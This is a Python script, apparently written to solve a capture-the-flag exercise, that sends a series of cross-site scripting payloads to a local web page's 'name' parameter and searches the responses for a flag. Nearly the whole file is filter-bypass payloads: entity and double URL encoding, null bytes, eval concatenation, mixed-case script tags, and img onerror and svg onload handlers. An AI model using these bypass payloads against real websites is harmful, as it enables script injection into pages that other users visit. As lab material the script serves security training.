import requests
import urllib.parse
import re

# Base URL
target_url = "http://127.0.0.1:32810/page"

# Test results storage
results = []

def test_payload(payload_name, payload_data):
    """Test a single payload and return results"""
    try:
        params = {"name": payload_data}
        response = requests.get(target_url, params=params, timeout=5)
        
        result = {
            "technique": payload_name,
            "payload": payload_data,
            "url": response.url,
            "status_code": response.status_code,
            "response_length": len(response.text),
            "has_flag": "FLAG{" in response.text,
            "full_response": response.text
        }
        
        # Check for signs of successful XSS
        # Look for unescaped payload or execution indicators
        if payload_data in response.text and "<script>" not in response.text.replace(payload_data, ""):
            result["potential_success"] = True
        else:
            result["potential_success"] = False
            
        return result
    except Exception as e:
        return {
            "technique": payload_name,
            "payload": payload_data,
            "error": str(e)
        }

print("="*60)
print("XSS BYPASS TESTING - /page?name= endpoint")
print("="*60)

# 1. HTML Entity Encoding
print("\n[1] Testing HTML Entity Encoding...")
entity_payload = "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert('XSS')&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;"
result = test_payload("HTML Entity Encoding", entity_payload)
results.append(result)
print(f"  Payload: {result['payload']}")
print(f"  Status: {result.get('status_code', 'ERROR')}")
if result.get('has_flag'):
    flag_match = re.search(r'FLAG\{[^}]+\}', result['full_response'])
    if flag_match:
        print(f"  [!] FLAG FOUND: {flag_match.group()}")

# 2. URL Double Encoding
print("\n[2] Testing URL Double Encoding...")
double_encoded = "%253Cscript%253Ealert(%2527XSS%2527)%253C%252Fscript%253E"
result = test_payload("URL Double Encoding", double_encoded)
results.append(result)
print(f"  Payload: {result['payload']}")
print(f"  Status: {result.get('status_code', 'ERROR')}")
if result.get('has_flag'):
    flag_match = re.search(r'FLAG\{[^}]+\}', result['full_response'])
    if flag_match:
        print(f"  [!] FLAG FOUND: {flag_match.group()}")

# 3. Unicode Normalization Bypass
print("\n[3] Testing Unicode Normalization Bypass...")
unicode_payload = "%u003Cscript%u003Ealert('XSS')%u003C/script%u003E"
result = test_payload("Unicode Normalization", unicode_payload)
results.append(result)
print(f"  Payload: {result['payload']}")
print(f"  Status: {result.get('status_code', 'ERROR')}")
if result.get('has_flag'):
    flag_match = re.search(r'FLAG\{[^}]+\}', result['full_response'])
    if flag_match:
        print(f"  [!] FLAG FOUND: {flag_match.group()}")

# 4. Null Byte Injection
print("\n[4] Testing Null Byte Injection...")
null_byte_payload = "%00%3Cscript%3Ealert('XSS')%3C/script%3E"
result = test_payload("Null Byte Injection", null_byte_payload)
results.append(result)
print(f"  Payload: {result['payload']}")
print(f"  Status: {result.get('status_code', 'ERROR')}")
if result.get('has_flag'):
    flag_match = re.search(r'FLAG\{[^}]+\}', result['full_response'])
    if flag_match:
        print(f"  [!] FLAG FOUND: {flag_match.group()}")

# 5. Character Concatenation (JavaScript)
print("\n[5] Testing Character Concatenation...")
concat_payload = "<script>eval('al'+'ert(\'XSS\')')</script>"
result = test_payload("Character Concatenation", concat_payload)
results.append(result)
print(f"  Payload: {result['payload']}")
print(f"  Status: {result.get('status_code', 'ERROR')}")
if result.get('has_flag'):
    flag_match = re.search(r'FLAG\{[^}]+\}', result['full_response'])
    if flag_match:
        print(f"  [!] FLAG FOUND: {flag_match.group()}")

# 6. Case Variations on Tag Names
print("\n[6] Testing Case Variations...")
case_variants = [
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<sCrIpT>alert('XSS')</sCrIpT>",
    "<SCRIPT>alert('XSS')</SCRIPT>",
    "<ScrIPt>alert('XSS')</sCRipT>"
]

for i, variant in enumerate(case_variants, 1):
    result = test_payload(f"Case Variation {i}", variant)
    results.append(result)
    print(f"  Variant {i}: {result['payload']}")
    print(f"  Status: {result.get('status_code', 'ERROR')}")
    if result.get('has_flag'):
        flag_match = re.search(r'FLAG\{[^}]+\}', result['full_response'])
        if flag_match:
            print(f"  [!] FLAG FOUND: {flag_match.group()}")

# Additional advanced bypasses
print("\n[7] Testing Advanced Bypass Combinations...")

# HTML entity + URL encoding combo
combo1 = "%26%2360%3Bscript%26%2362%3Balert('XSS')%26%2360%3B%2Fscript%26%2362%3B"
result = test_payload("HTML+URL Combo", combo1)
results.append(result)
print(f"  Combo Payload: {result['payload']}")
print(f"  Status: {result.get('status_code', 'ERROR')}")
if result.get('has_flag'):
    flag_match = re.search(r'FLAG\{[^}]+\}', result['full_response'])
    if flag_match:
        print(f"  [!] FLAG FOUND: {flag_match.group()}")

# Alternative event handlers (in case script tags blocked)
print("\n[8] Testing Alternative Event Handlers...")

img_onerror = "<img src=x onerror=alert('XSS')>"
result = test_payload("IMG OnError", img_onerror)
results.append(result)
print(f"  Payload: {result['payload']}")
print(f"  Status: {result.get('status_code', 'ERROR')}")
if result.get('has_flag'):
    flag_match = re.search(r'FLAG\{[^}]+\}', result['full_response'])
    if flag_match:
        print(f"  [!] FLAG FOUND: {flag_match.group()}")

svg_onload = "<svg onload=alert('XSS')>"
result = test_payload("SVG OnLoad", svg_onload)
results.append(result)
print(f"  Payload: {result['payload']}")
print(f"  Status: {result.get('status_code', 'ERROR')}")
if result.get('has_flag'):
    flag_match = re.search(r'FLAG\{[^}]+\}', result['full_response'])
    if flag_match:
        print(f"  [!] FLAG FOUND: {flag_match.group()}")

# Summary
print("\n" + "="*60)
print("TEST SUMMARY")
print("="*60)

successful_tests = []
for r in results:
    if r.get('potential_success') or r.get('has_flag'):
        successful_tests.append(r)

if successful_tests:
    print(f"\n[!] {len(successful_tests)} potentially successful payloads found:")
    for test in successful_tests:
        print(f"\n  Technique: {test['technique']}")
        print(f"  Payload: {test['payload']}")
        print(f"  Status: {test.get('status_code', 'N/A')}")
        if test.get('has_flag'):
            print(f"  🚩 FLAG DETECTED IN RESPONSE")
else:
    print("\n[-] No successful bypasses detected with these techniques")

# Check all responses for FLAGS
print("\nScanning all responses for FLAG patterns...")
all_flags = []
for r in results:
    if r.get('full_response'):
        flags = re.findall(r'FLAG\{[^}]+\}', r['full_response'])
        if flags:
            all_flags.extend(flags)

if all_flags:
    print(f"\n🚩 FLAGS FOUND: {list(set(all_flags))}")
else:
    print("\nNo FLAG patterns found in any responses")
